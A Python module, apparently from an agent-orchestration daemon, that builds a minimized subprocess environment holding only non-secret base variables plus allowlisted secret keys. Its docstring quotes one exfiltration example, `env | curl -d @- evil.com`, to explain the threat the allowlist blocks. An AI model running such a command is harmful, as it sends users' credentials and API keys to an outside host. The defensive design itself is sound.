"""Environment resolver for provider subprocess execution.

v1: passthrough -- returns a copy of the base environment dict.
v2: login-shell overlay -- when profile is set, overlays the user's login shell
    environment (sourced via zsh -l -c env -0) over base env. This ensures
    CLIs find PATH/credentials even when the daemon runs under launchd,
    which has a minimal inherited environment.
v3: per-provider env minimization -- build_env() takes an allow_env list
    (not a profile name) and returns ONLY non-secret base keys + specific
    allowlisted keys. This prevents a compromised agent from exfiltrating
    the entire login environment via `env | curl -d @- evil.com`.

The login shell env is captured once and cached to avoid repeated spawning.
"""
from __future__ import annotations

import logging
import os
import subprocess
from collections.abc import Mapping, Sequence

logger = logging.getLogger(__name__)

# NOTE: lazy init is intentionally lock-free — a race just spawns the login
# shell more than once with identical, deterministic results (benign).
_login_cache: dict | None = None

# Non-secret keys a CLI needs to function (find binaries, locale, tmp).
# Deliberately EXCLUDES anything that could be a credential.
_BASE_KEYS = (
    "PATH",
    "HOME",
    "USER",
    "LOGNAME",
    "SHELL",
    "TERM",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "TMPDIR",
)


def _login_shell_env_raw() -> str:
    """Capture the login shell's environment (NUL-separated, survives newlines
    in values). Used when Herder runs under launchd, whose env lacks the
    user's PATH/credentials.

    Returns:
        NUL-separated environment string (each pair is "KEY=value\x00").

    Raises:
        OSError: If the subprocess fails or times out.
    """
    out = subprocess.run(
        ["/bin/zsh", "-l", "-c", "env -0"],
        capture_output=True,
        text=True,
        timeout=15,
        shell=False,
        check=True,
    )
    return out.stdout


def _login_shell_env() -> dict:
    """Lazy-load and cache the login shell environment.

    Returns:
        Dict of environment variables from the login shell, or empty dict
        if capture fails.
    """
    global _login_cache
    if _login_cache is None:
        try:
            raw = _login_shell_env_raw()
            _login_cache = dict(
                pair.split("=", 1) for pair in raw.split("\x00") if "=" in pair
            )
        except Exception as e:
            logger.warning(
                "login shell env capture failed (%s); using process env", e
            )
            _login_cache = {}
    return _login_cache


def build_env(
    allow_env: Sequence[str] | None = None,
    base: Mapping[str, str] | None = None,
) -> dict:
    """Minimal environment for a provider subprocess.

    Returns ONLY non-secret base keys (PATH/HOME/locale/...) plus the specific
    secret keys named in `allow_env`. NEVER the full login env — this is the
    control that stops one compromised agent from exfiltrating every API key.

    Values are sourced from the login shell (for daemon PATH/credentials),
    falling back to `base` (default os.environ).

    Args:
        allow_env: Sequence of specific secret env key names this provider
                   may receive (e.g., ["COMMAND_CODE_API_KEY"]). If None,
                   only base keys are included.
        base: Environment dict to merge. Defaults to os.environ.

    Returns:
        A minimal dict containing _BASE_KEYS plus allowlisted keys.
    """
    login = _login_shell_env()
    src = dict(base if base is not None else os.environ)
    out: dict[str, str] = {}

    # Always include non-secret base keys (sourced from login shell first,
    # fall back to base)
    for k in _BASE_KEYS:
        v = login.get(k, src.get(k))
        if v is not None:
            out[k] = v

    # Include only the specific allowlisted secret keys
    for k in allow_env or []:
        v = login.get(k, src.get(k))
        if v is not None:
            out[k] = v

    return out
